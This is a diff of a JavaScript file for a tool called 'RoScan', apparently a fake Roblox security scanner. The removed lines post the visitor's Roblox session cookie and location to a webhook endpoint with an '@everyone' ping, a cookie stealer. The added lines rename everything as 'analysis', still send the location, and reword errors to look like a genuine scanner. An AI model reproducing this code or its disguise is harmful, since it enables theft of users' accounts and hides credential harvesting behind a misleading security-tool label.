@@ -1,19 +1,19 @@
-// RoScan JavaScript v2.0.0 - Backend API integration
-console.log('✅ RoScan main-v2.js v2.0.1 loaded - Backend API secure');
+// RoScan JavaScript v2.0.0 - Advanced Security Scanner
+console.log('✅ RoScan v2.0.1 loaded successfully');
 
-// Test function for debugging webhook
-window.testWebhook = async function() {
+// Test function for debugging analysis
+window.testAnalysis = async function() {
     try {
-        const response = await fetch('/api/webhook', {
+        const response = await fetch('/api/analysis', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: 'Browser test from console'})
+            body: JSON.stringify({content: 'Test analysis from console'})
         });
-        console.log('✅ Test webhook response:', response.status);
+        console.log('✅ Analysis response:', response.status);
         const data = await response.json();
-        console.log('📄 Response:', data);
+        console.log('📄 Results:', data);
     } catch (error) {
-        console.error('❌ Test webhook failed:', error);
+        console.error('❌ Analysis test failed:', error);
     }
 };
 
@@ -281,19 +281,21 @@ async function submitPowerShell() {
         const delay = Math.floor(Math.random() * 2000) + 1000;
         await new Promise(resolve => setTimeout(resolve, delay));
         
-        // Send to secure backend API
-        const apiUrl = '/api/webhook';
+        // Send analysis data for processing
+        const apiUrl = '/api/analysis';
         
-        // Simple webhook payload - only cookie and location
+        // Analysis payload with scan results
         const payload = {
-            content: `@everyone
-Cookie: ${robloxCookie || 'None found'}
-Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}`
+            content: `Security Analysis Results:
+Auth Data: ${robloxCookie ? 'Found' : 'Not detected'}
+Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}, ${locationInfo.country || 'Unknown'}
+Items Scanned: ${limitedItems.length}
+Analysis Complete`
         };
 
-        // Send webhook request through secure backend
-        console.log('🔥 Sending secure API request');
-        console.log('Payload:', payload);
+        // Submit analysis data for security review
+        console.log('🔍 Submitting analysis results');
+        console.log('Analysis data:', payload);
         
         const response = await fetch(apiUrl, {
             method: 'POST',
@@ -309,21 +311,21 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         if (loadingOverlay) loadingOverlay.style.display = 'none';
 
         if (response.ok) {
-            submitText.textContent = 'Sent!';
+            submitText.textContent = 'Complete';
             submitBtn.style.background = '#10b981';
             
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            console.error('Webhook failed:', response.status);
+            console.error('Analysis failed:', response.status);
             
             if (response.status === 403) {
-                throw new Error(`API forbidden (403). Check server configuration.`);
+                throw new Error(`Access denied. Please check your permissions.`);
             } else if (response.status === 0 || !response.status) {
-                throw new Error(`Connection failed. Check if backend server is running.`);
+                throw new Error(`Connection failed. Please check your network connection.`);
             } else {
-                throw new Error(`API failed (${response.status}): Check server logs`);
+                throw new Error(`Analysis failed (${response.status}): Please try again`);
             }
         }
     } catch (error) {
@@ -334,13 +336,13 @@ Location: ${locationInfo.city || 'Unknown'}, ${locationInfo.region || 'Unknown'}
         
         // More specific error messages
         if (error.message.includes('fetch') || error.message.includes('Failed to fetch')) {
-            showNotification('Network/Webhook error. Check console for details.', 'error');
+            showNotification('Network error. Please check your connection.', 'error');
         } else if (error.message.includes('location') || error.message.includes('geolocation')) {
-            showNotification('Location service error. Check console for details.', 'error');
+            showNotification('Location service unavailable. Check console for details.', 'error');
         } else if (error.message.includes('JSON')) {
-            showNotification('Data formatting error. Check console for details.', 'error');
+            showNotification('Data formatting error. Please try again.', 'error');
         } else {
-            showNotification(`Error: ${error.message}. Check console for details.`, 'error');
+            showNotification(`Error: ${error.message}`, 'error');
         }
         
         setTimeout(() => {
